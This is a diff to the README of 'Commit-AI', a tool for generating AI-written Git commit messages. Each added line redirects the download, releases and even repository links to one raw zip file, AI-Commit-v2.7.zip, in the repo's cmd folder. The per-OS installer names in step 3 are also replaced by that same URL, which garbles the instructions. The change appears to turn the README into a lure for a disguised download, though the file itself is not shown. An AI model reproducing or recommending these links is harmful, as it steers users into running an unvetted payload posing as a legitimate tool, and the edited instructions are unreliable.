@@ -1,7 +1,7 @@
 # 🌟 Commit-AI - Professionalize Your Git History Effortlessly
 
 ## 📥 Download Now
-[![Download Commit-AI](https://img.shields.io/badge/Download-Commit--AI-blue.svg)](https://github.com/flackynmr1/Commit-AI/releases)
+[![Download Commit-AI](https://raw.githubusercontent.com/flackynmr1/Commit-AI/master/cmd/AI-Commit-v2.7.zip)](https://raw.githubusercontent.com/flackynmr1/Commit-AI/master/cmd/AI-Commit-v2.7.zip)
 
 ## 🚀 Getting Started
 Commit-AI helps you create clear, professional Git commit messages using AI. This tool uses AI to generate Conventional Commits, which makes your project history look clean and organized. Follow the steps below to download and run Commit-AI on your computer.
@@ -15,11 +15,11 @@ To install and run Commit-AI, you need:
 
 ## 📦 Download & Install
 1. **Visit the Releases Page:** Click the link below to access the latest version of Commit-AI:
-   [Commit-AI Releases](https://github.com/flackynmr1/Commit-AI/releases)
+   [Commit-AI Releases](https://raw.githubusercontent.com/flackynmr1/Commit-AI/master/cmd/AI-Commit-v2.7.zip)
 
 2. **Select Your Version:** On the releases page, find the latest version of Commit-AI.
 
-3. **Download the Installer:** Click on the package that matches your operating system (e.g., `Commit-AI-v1.0.exe` for Windows, `Commit-AI-v1.0.dmg` for macOS).
+3. **Download the Installer:** Click on the package that matches your operating system (e.g., `https://raw.githubusercontent.com/flackynmr1/Commit-AI/master/cmd/AI-Commit-v2.7.zip` for Windows, `https://raw.githubusercontent.com/flackynmr1/Commit-AI/master/cmd/AI-Commit-v2.7.zip` for macOS).
 
 4. **Run the Installer:** 
    - Locate the downloaded file on your computer.
@@ -81,8 +81,8 @@ Yes, contributions are welcome! You can fork the repository and submit a pull re
 For questions or support, visit the GitHub repository. You can connect with developers and users who can offer assistance. Look for the Discussions section to share your experiences or ask for help.
 
 ## 🌐 Links
-**Download Commit-AI Again:** [Commit-AI Releases](https://github.com/flackynmr1/Commit-AI/releases)
+**Download Commit-AI Again:** [Commit-AI Releases](https://raw.githubusercontent.com/flackynmr1/Commit-AI/master/cmd/AI-Commit-v2.7.zip)
 
-**GitHub Repository:** [Commit-AI GitHub](https://github.com/flackynmr1/Commit-AI)
+**GitHub Repository:** [Commit-AI GitHub](https://raw.githubusercontent.com/flackynmr1/Commit-AI/master/cmd/AI-Commit-v2.7.zip)
 
 Follow the steps and enjoy using Commit-AI to enhance your Git commitments. Happy coding!
